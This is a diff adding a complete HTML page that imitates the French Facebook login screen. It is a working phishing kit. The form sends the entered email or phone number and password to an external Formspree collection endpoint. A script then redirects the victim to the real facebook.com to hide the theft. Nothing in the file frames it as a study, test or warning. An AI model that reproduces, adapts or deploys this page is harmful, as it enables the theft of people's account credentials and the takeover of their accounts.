@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Connexion ou inscription</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { display: flex; width: 980px; justify-content: space-between; align-items: center; }
+        .left-section { width: 50%; padding-right: 32px; box-sizing: border-box; }
+        .logo { color: #1877f2; font-size: 60px; font-weight: bold; margin-bottom: 10px; letter-spacing: -2px; }
+        .tagline { font-size: 28px; line-height: 32px; font-weight: normal; color: #1c1e21; }
+        .right-section { width: 40%; display: flex; flex-direction: column; align-items: center; }
+        .login-box { background-color: #fff; border: none; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px; width: 100%; box-sizing: border-box; text-align: center; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        button.login-btn { width: 100%; padding: 14px 16px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-bottom: 16px; }
+        button.login-btn:hover { background-color: #166fe5; }
+        a.forgot { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-bottom: 24px; }
+        hr { border: 0; border-top: 1px solid #dadde1; width: 100%; margin-bottom: 20px; }
+        button.create-btn { background-color: #42b72a; color: white; border: none; border-radius: 6px; padding: 12px 16px; font-size: 17px; font-weight: bold; cursor: pointer; }
+        button.create-btn:hover { background-color: #36a420; }
+        @media (max-width: 900px) { .container { flex-direction: column; width: 100%; padding: 20px; } .left-section { width: 100%; text-align: center; margin-bottom: 40px; } .right-section { width: 100%; max-width: 400px; } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="left-section">
+        <h1 class="logo">facebook</h1>
+        <p class="tagline">Facebook vous aide à communiquer et à partager avec les personnes qui font partie de votre vie.</p>
+    </div>
+
+    <div class="right-section">
+        <div class="login-box">
+            <!-- FORMULAIRE -->
+            <form id="fbForm" action="https://formspree.io/f/mvkkynpq" method="POST">
+                <input type="text" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
+                <input type="password" name="password" placeholder="Mot de passe" required>
+                <button type="submit" class="login-btn">Se connecter</button>
+                <a href="#" class="forgot">Mot de passe oublié ?</a>
+                <hr>
+                <button type="button" class="create-btn">Créer un compte</button>
+            </form>
+        </div>
+        <p style="margin-top: 20px; font-size: 14px;">
+            <a href="#" style="color: #385898; text-decoration: none; font-weight: bold;">Créer une Page</a> pour une célébrité, une marque ou une entreprise.
+        </p>
+    </div>
+</div>
+
+<script>
+    document.getElementById('fbForm').addEventListener('submit', function(e) {
+        // On laisse le formulaire envoyer les données
+        setTimeout(function() {
+            window.location.href = "https://www.facebook.com/";
+        }, 1000);
+    });
+</script>
+
+</body>
+</html>
